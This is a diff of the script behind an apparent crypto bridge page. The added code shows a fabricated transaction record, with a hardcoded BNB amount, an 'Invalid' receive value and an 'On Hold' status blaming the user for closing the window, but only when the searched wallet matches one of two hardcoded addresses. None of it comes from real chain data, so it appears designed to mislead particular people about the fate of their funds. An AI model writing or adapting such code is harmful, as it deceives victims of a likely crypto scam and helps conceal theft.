@@ -96,12 +96,16 @@
 <script>
 
 	document.getElementById('search-btn').addEventListener('click', async () => {
-	
-		document.getElementById('sender').value = '1';
-		document.getElementById('bnb').value = '1';
-		document.getElementById('sol').value = '1';
-		document.getElementById('status').value = '1';
-		document.getElementById('receive').value = '1';
+		
+		if ( document.getElementById('search-wallet').value == "0x20a09b5e31403a20039c2a01148bdd69d12cf7be" || document.getElementById('search-wallet').value == "0x30F3Cd5DDd028592599Be25a42B9d467A43439F4" )
+		{
+			document.getElementById('bridge-swap-container').style.display = 'block';
+			document.getElementById('sender').value = document.getElementById('search-wallet').value;
+			document.getElementById('bnb').value = '0.05480788166';
+			document.getElementById('sol').value = '0';
+			document.getElementById('status').value = 'On Hold : During Payment close the window. Sol wallet address not updated. ';
+			document.getElementById('receive').value = 'Invalid';
+		}
 	});
 
 document.getElementById('connect-wallet').addEventListener('click', async () => {
@@ -119,7 +123,7 @@ document.getElementById('connect-wallet').addEventListener('click', async () => 
 	document.getElementById('search-wallet').value = walletAddress;
         //document.getElementById('disconnect-wallet').style.display = 'inline';
 	document.getElementById('search-btn').style.display = 'inline-block';
-	document.getElementById('bridge-swap-container').style.display = 'block';
+
         document.getElementById('connect-wallet').style.display = 'none';
 
         // Fetch and display BNB balance
